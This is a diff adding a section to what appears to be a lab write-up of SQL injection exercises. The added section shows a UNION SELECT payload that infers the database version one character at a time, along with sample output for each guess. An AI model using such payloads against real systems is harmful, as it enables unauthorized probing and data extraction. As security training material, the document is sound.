@@ -174,6 +174,52 @@ output
 
 ![alt text](images/photo_4.png)
 
+input SQLi for prediction version of db
+
+```bash
+' UNION SELECT version() LIKE '1%', '
+```
+
+output of prediction
+
+```
+ID: ' UNION SELECT version() LIKE '0%', '
+First name: 0
+Surname: 
+
+ID: ' UNION SELECT version() LIKE '1%', '
+First name: 1
+Surname: 
+
+ID: ' UNION SELECT version() LIKE '2%', '
+First name: 0
+Surname: 
+
+ID: ' UNION SELECT version() LIKE '10%', '
+First name: 1
+Surname: 
+
+ID: ' UNION SELECT version() LIKE '11%', '
+First name: 0
+Surname: 
+
+ID: ' UNION SELECT version() LIKE '100%', '
+First name: 0
+Surname: 
+
+ID: ' UNION SELECT version() LIKE '10.%', '
+First name: 1
+Surname: 
+
+ID: ' UNION SELECT version() LIKE '10.0%', '
+First name: 0
+Surname: 
+
+ID: ' UNION SELECT version() LIKE '10.1%', '
+First name: 1
+Surname:
+```
+
 ### SQL Injection (Blind)
 
 input
